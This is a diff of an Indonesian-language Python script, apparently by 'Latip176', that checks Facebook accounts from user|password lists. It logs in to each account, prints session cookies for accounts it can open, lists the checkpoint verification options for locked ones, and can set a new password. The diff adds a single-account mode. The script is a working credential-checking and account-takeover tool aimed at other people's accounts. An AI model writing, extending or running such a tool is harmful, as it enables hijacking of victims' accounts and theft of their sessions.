@@ -2,15 +2,11 @@ import requests as req,re
 from bs4 import BeautifulSoup as par
 
 """
-   ______     __      ____             _ 
-  / ____/__  / /__   / __ \____  _____(_)
- / /   / _ \/ //_/  / / / / __ \/ ___/ / Coded By: Latip176
-/ /___/  __/ ,<    / /_/ / /_/ (__  ) / https://latip176.my.id
-\____/\___/_/|_|   \____/ .___/____/_/   
-                       /_/               
-	Cek Opsi Checkpoint Facebook
-	
+Copyright © 2021 - 2023 | Latip176
+Semua codingan dibuat oleh Latip176.
+
 """
+
 #data - data
 data,data2={},{}
 aman,cp,salah=0,0,0
@@ -18,20 +14,19 @@ ubahP,pwBaru=[],[]
 
 class Main(object):
 	
-	def __init__(self,url,file):
+	def __init__(self,url,file,cek,pww,ubah):
 		self.url = url
-		self.file(file)
-	def file(self,file):
-		ww=input("[?] Ubah pw ketika tap yes [y/t]: ")
-		if ww in ("y","ya"):
-			ubahP.append("y")
-			pwBar=input("[+] Masukan pw baru: ")
-			if len(pwBar) <= 5:
-				exit("Password harus lebih dari 6 character!")
-			else:
-				pwBaru.append(pwBar)
+		self.satua = False
+		pwBaru.append(pww)
+		ubahP.append(ubah)
+		if(cek=="file"):
+			self.file(file)
+		elif(cek=="satu"):
+			file = [file]
+			self.satu(file)
 		else:
-			print("> Skipped")
+			exit("Error")
+	def file(self,file):
 		print("[✓] Jumlah akun:",len(file),f"\n{'='*45}\n")
 		for data in file:
 			data = data.replace("\n","")
@@ -40,7 +35,15 @@ class Main(object):
 			self.pw = pw
 			print(f"[+] Check : {self.user} | {self.pw}")
 			self.cek_opsi()
-
+	def satu(self,file):
+		for data in file:
+			data = data.replace("\n","")
+			user,pw = data.split("|")
+			self.user = user
+			self.pw = pw
+			self.satua = True
+			self.cek_opsi()
+		
 class Eksekusi(Main):
 	
 	def cek_opsi(self):
@@ -65,10 +68,14 @@ class Eksekusi(Main):
 			print("[!] Nyalakan lalu matikan mode pesawat selama 2 Detik.")
 		if "c_user" in session.cookies.get_dict():
 			if "Akun Anda Dikunci" in urlPost.text:
+				if self.satua==True:
+					print(f"\r[OK] Akun aman			\n[=] {user} | {pw}					\n\n",end="")
 				print(f"\r[×] Akun sesi new					\n\n",end="")
 			else:
 				aman+=1
 				coki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
+				if self.satua==True:
+					print(f"\r[OK] Akun aman			\n[=] {user} | {pw}					\n\n",end="")
 				print(f"\r[√] Akun Aman\n[=] Cookie: {coki}				\n\n",end="")
 		elif "checkpoint" in session.cookies.get_dict():
 			cp+=1
@@ -82,6 +89,8 @@ class Eksekusi(Main):
 			response2=par(an.text,"html.parser")
 			number=0
 			cek=[cek for cek in response2.find_all("option")]
+			if self.satua==True:
+				print(f"\r\33[1;33m[CP] {self.user} | {self.pw}								\33[37;1m\n",end="")
 			print(f"\r[!] Terdapat {len(cek)} opsi:\n",end="")
 			if(len(cek)==0):
 				if "Lihat detail login yang ditampilkan. Ini Anda?" in title:
